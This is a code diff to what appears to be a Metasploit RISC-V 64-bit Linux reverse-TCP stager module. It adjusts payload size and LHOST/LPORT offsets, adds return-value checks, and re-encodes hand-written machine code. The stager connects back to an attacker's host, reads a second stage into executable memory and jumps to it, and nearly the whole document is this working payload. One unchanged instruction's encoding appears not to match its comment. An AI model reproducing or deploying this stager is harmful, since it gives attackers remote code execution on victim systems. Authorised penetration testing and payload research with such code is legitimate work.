@@ -6,7 +6,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = 212
+  CachedSize = 224
 
   include Msf::Payload::Linux::Riscv64le::Prepends
   include Msf::Payload::Stager
@@ -25,8 +25,8 @@ module MetasploitModule
         'Stager' => {
           'Offsets' =>
                   {
-                    'LPORT' => [ 206, 'n' ],
-                    'LHOST' => [ 208, 'ADDR' ]
+                    'LPORT' => [ 218, 'n' ],
+                    'LHOST' => [ 220, 'ADDR' ]
                   },
           'Payload' => stager_payload
         }
@@ -35,7 +35,7 @@ module MetasploitModule
   end
 
   def handle_intermediate_stage(conn, payload)
-    print_status("Transmitting stage length value (#{payload.length} bytes) ...")
+    print_status("Transmitting stage length value... (#{payload.length} bytes)")
     conn.put([payload.length].pack('V'))
     true
   end
@@ -57,7 +57,7 @@ module MetasploitModule
       0x01000613,          # li    a2, 16            # addrlen
       0x0cb00893,          # li    a7, 203           # SYS_connect
       0x00000297,          # auipc t0, 0             # t0 = PC
-      0x0a828293,          # addi  t0, t0, 168       # t0 = &sockaddr (end of payload)
+      0x0b428293,          # addi  t0, t0, 180       # t0 = &sockaddr (end of payload)
       0xff010113,          # addi  sp, sp, -16       # allocate stack
       0x0002b303,          # ld    t1, 0(t0)         # load sockaddr[0:7]
       0x00613023,          # sd    t1, 0(sp)         # store to stack
@@ -65,7 +65,7 @@ module MetasploitModule
       0x00613423,          # sd    t1, 8(sp)         # store to stack
       0x00010593,          # mv    a1, sp            # a1 = &sockaddr on stack
       0x00000073,          # ecall
-      0x04051863,          # bnez  a0, fail
+      0x08051263,          # bnez  a0, fail
 
       # read(s1, sp, 4) — read stage length
       0x00048513,          # mv    a0, s1            # fd
@@ -74,8 +74,12 @@ module MetasploitModule
       0x03f00893,          # li    a7, 63            # SYS_read
       0x00000073,          # ecall
 
+      # validate read returned exactly 4 bytes
+      0x00400313,          # li    t1, 4
+      0x06651463,          # bne   a0, t1, fail
+
       # mmap(NULL, aligned_length, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
-      0x00012e03,          # lw    t3, 0(sp)         # t3 = stage length
+      0x00016e03,          # lwu   t3, 0(sp)         # t3 = stage length (unsigned)
       0x00c00513,          # li    a0, 0             # addr = NULL (let kernel choose)
       0x00ce5593,          # srli  a1, t3, 12        # a1 = length >> 12
       0x00158593,          # addi  a1, a1, 1         # round up to next page
@@ -86,6 +90,10 @@ module MetasploitModule
       0x00000793,          # li    a5, 0             # offset = 0
       0x0de00893,          # li    a7, 222           # SYS_mmap
       0x00000073,          # ecall
+
+      # validate mmap succeeded
+      0x02054c63,          # bltz  a0, fail
+
       0x000e0e93,          # mv    t4, t3            # t4 = remaining bytes
       0x00050f13,          # mv    t5, a0            # t5 = mmap base (exec target)
       0x00050f93,          # mv    t6, a0            # t6 = write pointer
@@ -96,13 +104,13 @@ module MetasploitModule
       0x000e8613,          # mv    a2, t4            # count = remaining
       0x03f00893,          # li    a7, 63            # SYS_read
       0x00000073,          # ecall
-      0x00a04863,          # bltz  a0, fail          # read error
+      0x00054a63,          # bltz  a0, fail          # read error
       0x00af8fb3,          # add   t6, t6, a0        # advance pointer
       0x40ae8eb3,          # sub   t4, t4, a0        # decrement remaining
-      0xfc0e98e3,          # bnez  t4, read_loop     # loop if more data
+      0xfe0e90e3,          # bnez  t4, read_loop     # loop if more data
 
       # jump to stage — socket fd in s1
-      0x000f0067, # jr    t5                # jump to mmap'd stage
+      0x000f0067, # jr    t5               # jump to mmap'd stage
 
       # fail: exit(0)
       0x00000513,          # li    a0, 0
